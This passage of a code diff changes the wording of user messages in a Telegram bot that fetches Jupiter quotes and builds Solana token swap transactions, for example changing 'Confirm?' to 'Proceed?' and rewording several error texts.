+            f"📊 *Quote*\n\nSpend: `{sol_amount} SOL`\nReceive: `{out_amount}` tokens\n\nProceed?",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("✅ Confirm", callback_data="confirm_buy"),
@@ -1181,19 +1063,19 @@ async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         try:
             token_amount = int(text)
         except ValueError:
-            await update.message.reply_text("❌ Invalid amount.")
+            await update.message.reply_text("❌ Invalid amount. Enter a number.")
             return
 
         token_mint = ctx.user_data.get("token_mint")
-        await update.message.reply_text("⏳ Getting quote...")
+        await update.message.reply_text("⏳ Fetching quote...")
         quote = await jupiter_quote(token_mint, SOL_MINT, token_amount)
         if not quote:
-            await update.message.reply_text("❌ Could not get quote from Jupiter.")
+            await update.message.reply_text("❌ Could not fetch a quote from Jupiter.")
             return
 
         out_lamports = int(quote.get("outAmount", 0))
         await update.message.reply_text(
-            f"📊 *Quote*\n\nSell: `{token_amount}` tokens\nReceive: `{out_lamports/1e9:.4f} SOL`\n\nConfirm?",
+            f"📊 *Quote*\n\nSell: `{token_amount}` tokens\nReceive: `{out_lamports/1e9:.4f} SOL`\n\nProceed?",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("✅ Confirm", callback_data="confirm_sell"),
@@ -1213,19 +1095,19 @@ async def confirm_swap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     entry   = user_wallets.get(uid)
 
     if not kp or not entry:
-        await ctx.bot.send_message(chat_id, "❌ No wallet found.")
+        await ctx.bot.send_message(chat_id, "❌ No wallet is connected.")
         return
 
     quote = ctx.user_data.get("pending_quote")
     if not quote:
-        await ctx.bot.send_message(chat_id, "❌ Quote expired. Start over.")
+        await ctx.bot.send_message(chat_id, "❌ This quote expired. Start again.")
         return
 
     await ctx.bot.send_message(chat_id, "⏳ Building transaction...")
 
     swap_data = await jupiter_swap(quote, entry["pubkey"])
     if not swap_data or "swapTransaction" not in swap_data:
-        await ctx.bot.send_message(chat_id, "❌ Failed to build swap transaction.")
+        await ctx.bot.send_message(chat_id, "❌ Could not build the swap transaction.")
         return
 
     from solders.transaction import VersionedTransaction
